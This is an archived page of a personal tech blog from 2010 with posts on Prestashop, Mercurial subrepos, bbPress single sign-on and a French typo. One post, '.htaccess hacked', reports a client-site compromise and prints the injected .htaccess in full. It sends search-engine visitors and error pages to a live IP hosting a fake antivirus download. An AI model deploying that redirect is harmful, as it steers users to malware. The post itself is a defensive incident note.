@@ -1,0 +1,492 @@
+<!doctype html>
+<html class="no-js" lang="en-us">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>
+     Pixelastic 
+  </title>
+  <meta name="description" content="Personal blog of Tim Carry. Posting mostly on tech-related stuff.">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="/public/css/forms.css">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+<body class="layout-reverse theme-base-0b">
+  <div class="sidebar">
+    <div class="container">
+      <div class="sidebar-about">
+        <h1><a href="/index.html">Pixelastic</a></h1>
+        <p class="lead">Personal blog of Tim Carry. Posting mostly on tech-related stuff.</p>
+      </div>
+
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-item active">
+          <a href="/">Home</a>
+        </li>
+        <li class="sidebar-nav-item">
+          <a href="/about/">About</a>
+        </li>
+        <li class="sidebar-nav-item">
+          <a href="/archive/">Archive</a>
+        </li>
+      </ul>
+      <div class="sidebar-footer">Website code available on <a href="https://github.com/pixelastic/blog.pixelastic.com">GitHub</a></div>
+    </div>
+  </div>
+
+  <div class="content container">
+    <div class="posts">
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/2010/03/08/quick-overview-of-the-prestashop-admin-panel/">
+        Quick overview of the Prestashop admin panel
+      </a>
+    </h1>
+
+    <span class="post-date">08 Mar 2010</span>
+
+    <p>One of my client wants to move an old osCommerce site to a new platform.
+osCommerce is really an old system, it does not handle plugins (you have to
+hack the core to add functionnality), has tablefull implementation and all the
+html and php code is mixed up.</p>
+
+<p>I decided to move it to Prestashop. Why Prestashop ? Well, obviously because
+there is not that much choice on the e-commerce open source website scene
+nowadays. The only other choice would have been Magento and from what I heard
+it is quite a pain to install and make it running.</p>
+
+<p>For this project, I need to act very quickly and the new website should be up
+and running in a matter of weeks. I&#39;ll use either a free theme or buy one
+online, but I won&#39;t have time to involve a full design process in this. I&#39;ll
+also have to migrate the complete product, customer and image database from
+one system to the other.</p>
+
+<p>That won&#39;t be an easy task but... well... I have to do it.</p>
+
+<p>Anyway, before starting this whole progress I wanted to see what Prestashop
+really had to offer me. I read their full feature list and hell, I even went
+to there open presentation, here in Paris, when the v1.0 was realeased but
+from what I&#39;ve seen it was a lot of talk, a lot of features a lot of
+everything but very little attention to the details.</p>
+
+<p>Well, after testing the demo admin panel a little bit I can say that my first
+impression was correct. Prestashop seems to be able to do a lot of stuff,
+really. But the way it is presented to the user is far from optimal. There are
+a lot of little mistakes that make using the interface more difficult that it
+should be.</p>
+
+<p>For example they are using icons to illustrate almost any action or link. But
+sometimes the icons do not have ANY link to the action. The icon for the
+&quot;tags&quot; section is a dark cloud, the icon for the search engines is a key is an
+arrow, they use the same icons for very different actions (editing a tab and
+paying with cheque). An icon is supposed to convey in a rapid and easy visual
+way what is text is about, but for Prestashop it is more like &quot;What is that
+supposed to mean ?&quot;</p>
+
+<p>SEO-friendly url are achieved through the use of .htaccess. Normal would you
+think ? Well yep, usually. But Prestashop does that by generating a huge
+.htaccess (one line for each product) and mapping each product individually.
+I&#39;m not really sure, and haven&#39;t run benchmarks on this but I guess it forces
+the server to parse the .htaccess file for each request and redirect to the
+correct page. It smells like a huge performance bottleneck for me, especially
+with a website using i18n and multiples urls.</p>
+
+<p>I would have saved the &quot;slug&quot; of each product (in multiple languages if
+needed) in the database and accessed products only based on their id. Of
+course, I would have hooked every methods that is supposed to write an html
+link or any url to a special method that would create the correct url based on
+the id, slug and language.</p>
+
+<p>They also use a default implementation of tinyMCE with a lot of useless
+options (like layers, html table, etc). They also have kept the default
+&quot;insert image&quot; implementation, asking for the image url instead of hooking a
+custom image upload script, much more useful.</p>
+
+<p>I&#39;ll have to use that admin panel anyway. I just hop that I do not
+underestimate the time needed to move the shop to this platform.</p>
+
+
+    <div class="tag-list">
+      
+        <a href="/tags/prestashop">#prestashop</a>
+      
+    </div>
+  </div>
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/2010/03/08/final-fantasy-xii-la-faute-de-frappe/">
+        Final Fantasy XII : La faute de frappe...
+      </a>
+    </h1>
+
+    <span class="post-date">08 Mar 2010</span>
+
+    <p>Je suis tombé dessus par hasard, en quatrième de couverture d&#39;un magazine, une
+pub pour FFXIII avec une belle faute de frappe imprimée à des millions
+d&#39;exemplaires...</p>
+
+<p>&quot;Aurez-vous le courage d&#39;affonter votre destin ?&quot;</p>
+
+<p>Affonter, oui, oui, affonter, ce qui signifie aiguiser des couteaux...</p>
+
+<p><img src="/files/2010/03/08/4b953b03b87e7-medium.jpg" alt="FFXII : Aurez-vous le courage d&#39;affonter votre
+des"></p>
+
+
+    <div class="tag-list">
+      
+        <a href="/tags/fun">#fun</a>
+      
+        <a href="/tags/ff13">#ff13</a>
+      
+        <a href="/tags/typo">#typo</a>
+      
+    </div>
+  </div>
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/2010/03/05/using-nested-subrepos-with-mercurial-and-tortoisehg/">
+        Using nested subrepos with Mercurial and TortoiseHg
+      </a>
+    </h1>
+
+    <span class="post-date">05 Mar 2010</span>
+
+    <p>Nowadays, when I&#39;m developping a new website, I almost always ended using
+parts and bits of the previous website I&#39;ve done. All my websites are based on
+the same framework (cakePHP) that I have itself updated with its own CMS
+(Caracole, more on that later).</p>
+
+<p>Caracole is made of several little plugins, each one of them focusing on a
+simple task (like handling 404 errors, adding a recycle bin, draftable
+elements, SEO-friendly url, and so on).</p>
+
+<p>I&#39;ve also updated each one of this plugins to BitBucket, allowing me to easily
+commit changes and clone new version from one project to another.</p>
+
+<p>But very often, when working on a specific project, using a specific plugin I
+think that I can update the plugin (be it either by adding a new feature or
+fixing a bug I&#39;ve discovered). In that case, I want my changes to be added to
+both the plugin (on BitBucket) and the project I&#39;m working on at the moment.</p>
+
+<p>To do that, I had to struggle my way with Mercurial because nested
+repositories (called subrepos) is not a trivial setup.</p>
+
+<h2>Setting up subrepo with Mercurial :</h2>
+
+<p>Let me show you the classical and easy way to achieve that :</p>
+
+<p>First, let&#39;s say you have your main repo. You go in the directory where you
+want to add your subrepo and you either create it using hg init or hg clone.</p>
+
+<p>You then go back to your main repo root and edit the .hgsub file (if you don&#39;t
+have this file yet, just create it). Add the following line to the .hgsub :</p>
+<div class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="na">path/to/your/subrepo</span> <span class="o">=</span> <span class="s">path/to/your/subrepo</span>
+</code></pre></div>
+<p>Now, on every subsequent commit Hg will be aware that your repo is holding a
+new subrepo. If you omit this line, Hg will not allow you to commit
+complaining about a repo inside an other repo.</p>
+
+<p>You can now safely commit your main repo, or your subrepo independently.</p>
+
+<p>Now, let&#39;s see the edge case.</p>
+
+<h2>Changing a classical sub directory into a subrepo</h2>
+
+<p>The classical example above is what you can find in the Mercurial help pages.
+It wasn&#39;t that helpful for me because my setup was a little different and it
+was causing Hg a lot of trouble.</p>
+
+<p>I was not creating a new subrepo, nor cloning a new one. I had sub diretcory
+of my main app, that I wanted to change into a subrepo. My sub directory was
+named &#39;myplugin&#39; and I had a repo of that name hosted on BitBucket.</p>
+
+<p>So I tried to delete my existing &#39;myplugin&#39; directory, and clone the
+&#39;myplugin&#39; from BitBucket, edit the .hgsub and commit but Hg aborted the
+operation, complaining about the repo in repo file structure.</p>
+
+<p>After a lot of testing, and <a href="http://stackoverflow.com/questions/2371330/what-is-the-correct-way-to-%0Ahandle-nested-hg-repositories-with-mercurial-tortoiseh">cry for
+help</a>, I finally managed to
+get it to work. The workflow is almost the same, with one little new step.</p>
+
+<p>Deleting the &#39;myplugin&#39; folder wasn&#39;t enough. I had to tell Mercurial to
+completly remove this files from its index. Using TortoiseHg, I was able to do
+that by right clicking on the folder, and then choosing &#39;TortoiseHg &gt; Remove
+Files&#39;. Then I had to commit those changes, officially telling Mercurial to
+forget this files, and putting it in a state where those files aren&#39;t there at
+all.</p>
+
+<p>Then only was I able to clone my repo from BitBucket, edit the .hgsub file and
+commit my main repo.</p>
+
+
+    <div class="tag-list">
+      
+        <a href="/tags/cakephp">#cakephp</a>
+      
+        <a href="/tags/caracole">#caracole</a>
+      
+        <a href="/tags/hg">#hg</a>
+      
+        <a href="/tags/mercurial">#mercurial</a>
+      
+        <a href="/tags/tortoisehg">#tortoisehg</a>
+      
+        <a href="/tags/plugins">#plugins</a>
+      
+        <a href="/tags/subrepo">#subrepo</a>
+      
+    </div>
+  </div>
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/2010/03/03/htaccess-hacked/">
+        .htaccess hacked
+      </a>
+    </h1>
+
+    <span class="post-date">03 Mar 2010</span>
+
+    <p>Today a client called me telling me that its website was unavailable, or more
+exactly that the full content of the FTP was displayed instead of its
+homepage.</p>
+
+<p>After a little investigation it appears that the .htaccess file had been
+modified, here was the content I found :</p>
+<div class="highlight"><pre><code class="language-apache" data-lang="apache"><span class="nb">RewriteEngine</span> <span class="k">On</span>
+<span class="nb">ErrorDocument</span> <span class="m">400</span> http://217.23.5.232/hitin.php?land=20&amp;affid=20116
+<span class="nb">ErrorDocument</span> <span class="m">401</span> http://217.23.5.232/hitin.php?land=20&amp;affid=20116
+<span class="nb">ErrorDocument</span> <span class="m">403</span> http://217.23.5.232/hitin.php?land=20&amp;affid=20116
+<span class="nb">ErrorDocument</span> <span class="m">404</span> http://217.23.5.232/hitin.php?land=20&amp;affid=20116
+<span class="nb">ErrorDocument</span> <span class="m">500</span> http://217.23.5.232/hitin.php?land=20&amp;affid=20116
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*google.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*ask.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*yahoo.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*excite.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*altavista.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*msn.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*netscape.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*aol.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*hotbot.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*goto.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*infoseek.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*mamma.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*alltheweb.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*lycos.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*search.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*metacrawler.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*bing.* [OR]
+<span class="nb">RewriteCond</span> %{HTTP_REFERER} .*dogpile.*
+<span class="nb">RewriteRule</span> ^(.*)$ http://217.23.5.232/hitin.php?land=20&amp;affid=20116 [R=301,L]
+</code></pre></div>
+<p>A little search online told me that this IP refer to a malware website
+launching a fake Antivirus software installation.</p>
+
+<p>I have no idea how the <code>.htacces</code>s got modified, but I changed the FTP password.</p>
+
+
+    <div class="tag-list">
+      
+        <a href="/tags/hack">#hack</a>
+      
+        <a href="/tags/ftp">#ftp</a>
+      
+        <a href="/tags/htaccess">#htaccess</a>
+      
+    </div>
+  </div>
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/2010/02/17/integration-bbpress-forum-cakephp-application-part-4/">
+        Integration of a bbPress forum into a cakePHP application (part 4)
+      </a>
+    </h1>
+
+    <span class="post-date">17 Feb 2010</span>
+
+    <p>We&#39;re almost done. There is just one last thing we must do. We don&#39;t want our
+dear user to have to login twice, once for the main app and once for the form,
+do we ?</p>
+
+<h2>Creating the Configure keys</h2>
+
+<p>So first, go back to your <code>bb-config.php</code> file and if you haven&#39;t already,
+define the <code>BB_AUTH_KEY</code> and <code>BB_LOGGED_IN_KEY</code>.</p>
+
+<p>Go to your <code>app/config/bootstrap.php</code> and create entries in <code>Configure</code>for
+this same keys. I named mine <code>bbPress.authKey</code> and <code>bbPress.logKey</code>.</p>
+
+<p>Now, go back to your database, open the <code>bb_meta</code> table and find the
+<code>bb_auth_salt</code> and <code>bb_loggued_in_salt</code> values. Copy them to two more
+<code>Configure</code>keys (<code>bbPress.authSalt</code> and <code>bbPress.logSalt</code>).</p>
+
+<p>One last key to create. Head back to <code>bb-config.php</code> and add the following
+line :</p>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">define(&#39;BB_HASH&#39;, &#39;XXXXX&#39;);</span>
+</code></pre></div>
+<p>Of course, set <code>XXXX</code> to a unique string. The name of your website should
+suffice, it is just used to differenciate between cookies on the same domain.
+Report the same value in <code>Configure</code> : <code>bbPress.hash</code>.</p>
+
+<h2>Creating the cookies</h2>
+
+<p>You&#39;re now ready to create bbPress cookies. bbPress will need to create two
+different sets of cookie.</p>
+
+<p>A bbPress cookie contain a value formatted like :
+<code>&lt;login&gt;|&lt;expiration&gt;|&lt;hash&gt;</code></p>
+
+<p>The hash is based on the user password, login, expiration and several other
+keys. It also involve double hashing of the value, with different salt and key
+values.</p>
+
+<p>I&#39;ve eased the pain of understanding how to create a cookie value, just use
+the following function :</p>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">function __getCookieValue($options = array()) {</span>
+<span class="x">   // We will need the login, pass and expiration date to create the cookie</span>
+<span class="x">   $userLogin = $options[&#39;name&#39;]; // The user login</span>
+<span class="x">   $userPass = $options[&#39;password&#39;]; // The password encrypted in the database</span>
+<span class="x">   $userPassFragment = substr($userPass, 8, 4);    // We will take only a small part of the password</span>
+<span class="x">   $expiration = $options[&#39;expiration&#39;];</span>
+<span class="x">   $data = $userLogin.$userPassFragment.&quot;|&quot;.$expiration;    // The main data that will be used create the final hash</span>
+
+<span class="x">   // We first get a first hash key that we will use to generate a second one</span>
+<span class="x">   $firstKey = hash_hmac(&#39;md5&#39;, $data, $options[&#39;salt&#39;]);</span>
+<span class="x">   // Then we create the final hash saved in the cookie</span>
+<span class="x">   $finalHash = hash_hmac(&#39;md5&#39;, $userLogin.&#39;|&#39;.$expiration, $firstKey);</span>
+
+<span class="x">   // The final data to store in the cookie</span>
+<span class="x">   return $userLogin.&quot;|&quot;.$expiration.&quot;|&quot;.$finalHash;</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>You should pass to this function an array containing a name, password and
+expiration date. The password should be exactly as it is stored in the
+database.</p>
+
+<p>You should also pass a 4th value, named salt, that is different depending of
+the type of cookie you&#39;re trying to create. For a auth cookie, use
+<code>Configure::read(&#39;bbPress.authKey&#39;).Configure::read(&#39;bbPress.authSalt&#39;)</code> and
+for a log cookie, use
+<code>Configure::read(&#39;bbPress.logKey&#39;).Configure::read(&#39;bbPress.logSalt&#39;)</code>.</p>
+
+<p>You will need to create two log cookies (for <code>/</code> and <code>/forum/</code>) and three auth
+cookies (for <code>/forum/bb-admin</code>,<code>/forum/bb-plugins</code> and <code>/forum/my-plugins</code>).</p>
+
+<p>Here is the complete method for creating all these cookies. Just call it in
+your app whenever your want to log the current user to the forum. Just feed it
+a user and password.</p>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">/**</span>
+<span class="x">*    createCookies</span>
+<span class="x">*    Create the cookies that can be used to connect to the bbPress forum</span>
+<span class="x">*    bbPress does a lot of complicating stuff with hashing when creating its cookie. We replicate it here</span>
+<span class="x">*</span>
+<span class="x">*    The content of the cookie is formed in the format username|expirationDate|hash</span>
+<span class="x">*</span>
+<span class="x">*    The hash part is the most difficult, it involve double hashing based on various salt and values</span>
+<span class="x">**/</span>
+<span class="x">function createCookies($name, $pass) {</span>
+<span class="x"> $expirationDate = time() + 1209600; // When the cookie should stop working (2 weeks)</span>
+
+<span class="x"> // Getting the log in salt</span>
+<span class="x"> $completeSalt = Configure::read(&#39;bbPress.logKey&#39;).Configure::read(&#39;bbPress.logSalt&#39;);</span>
+<span class="x"> // The log in cookie name</span>
+<span class="x"> $cookieName = &quot;bbpress_logged_in_&quot;.Configure::read(&#39;bbPress.hash&#39;);</span>
+<span class="x"> // Getting the value</span>
+<span class="x"> $cookieValue = __getCookieValue(array(</span>
+<span class="x">   &#39;name&#39; =&gt; $name,</span>
+<span class="x">   &#39;password&#39; =&gt; $pass,</span>
+<span class="x">   &#39;salt&#39; =&gt; $completeSalt,</span>
+<span class="x">   &#39;expiration&#39; =&gt; $expirationDate</span>
+<span class="x"> ));</span>
+<span class="x"> // Setting the cookie for the correct path</span>
+<span class="x"> setcookie($cookieName, $cookieValue, $expirationDate, &quot;/&quot;, false, false, true);</span>
+<span class="x"> setcookie($cookieName, $cookieValue, $expirationDate, &quot;/forum/&quot;, false, false, true);</span>
+
+<span class="x"> // Getting the auth salt</span>
+<span class="x"> $completeSalt = Configure::read(&#39;bbPress.authKey&#39;).Configure::read(&#39;bbPress.authSalt&#39;);</span>
+<span class="x"> // The auth cookie name</span>
+<span class="x"> $cookieName = &quot;bbpress_&quot;.Configure::read(&#39;bbPress.hash&#39;);</span>
+<span class="x"> // Getting the value</span>
+<span class="x"> $cookieValue = __getCookieValue(array(</span>
+<span class="x">   &#39;name&#39; =&gt; $name,</span>
+<span class="x">   &#39;password&#39; =&gt; $pass,</span>
+<span class="x">   &#39;salt&#39; =&gt; $completeSalt,</span>
+<span class="x">   &#39;expiration&#39; =&gt; $expirationDate</span>
+<span class="x"> ));</span>
+<span class="x"> // Setting the cookie for the correct path</span>
+<span class="x"> setcookie($cookieName, $cookieValue, $expirationDate, &#39;/forum/bb-admin&#39;, false, false, true);</span>
+<span class="x"> setcookie($cookieName, $cookieValue, $expirationDate, &#39;/forum/bb-plugins&#39;, false, false, true);</span>
+<span class="x"> setcookie($cookieName, $cookieValue, $expirationDate, &#39;/forum/my-plugins&#39;, false, false, true);</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>And for logging out, just delete the cookies :</p>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">function clearCookies() {</span>
+<span class="x">   // The name of the cookie to delete</span>
+<span class="x">   $cookieName = &quot;bbpress_logged_in_&quot;.Configure::read(&#39;bbPress.hash&#39;);</span>
+<span class="x">   setcookie($cookieName, &quot;&quot;, time()-3600, &quot;/&quot;, false, false, true);</span>
+<span class="x">   setcookie($cookieName, &quot;&quot;, time()-3600, &quot;/forum/&quot;, false, false, true);</span>
+<span class="x">   // The auth cookie name</span>
+<span class="x">   $cookieName = &quot;bbpress_&quot;.Configure::read(&#39;bbPress.hash&#39;);</span>
+<span class="x">   setcookie($cookieName, &quot;&quot;, time()-3600, &#39;/forum/bb-admin&#39;, false, false, true);</span>
+<span class="x">   setcookie($cookieName, &quot;&quot;, time()-3600, &#39;/forum/bb-plugins&#39;, false, false, true);</span>
+<span class="x">   setcookie($cookieName, &quot;&quot;, time()-3600, &#39;/forum/my-plugins&#39;, false, false, true);</span>
+<span class="x"> }</span>
+</code></pre></div>
+<p>Hope all that helps ! It took some time to put all this together but I hope it
+could help other bakers out there.</p>
+
+<h2>Downloading</h2>
+
+<p>For anyone interested, here is a link to download all the files :
+http://www.pixelastic.com/download/bbpress.rar</p>
+
+<p>Note that it can&#39;t be used as-is because it involves a bbPress install, a
+custom Authentication system and also because I wrote it as part of a bigger
+plugin.</p>
+
+<p>So, feel free to browse the files and get what you need, but consider it as a
+part of a bigger app, so you&#39;ll have to re-plug what&#39;s missing.</p>
+
+
+    <div class="tag-list">
+      
+        <a href="/tags/bbpress">#bbpress</a>
+      
+        <a href="/tags/cakephp">#cakephp</a>
+      
+    </div>
+  </div>
+  
+</div>
+
+<div class="pagination">
+  
+    <a class="pagination-item older" href="/page41">Older</a>
+  
+  
+    
+      <a class="pagination-item newer" href="/page39">Newer</a>
+    
+  
+</div>
+
+  </div>
+
+</body>
+
+</html>
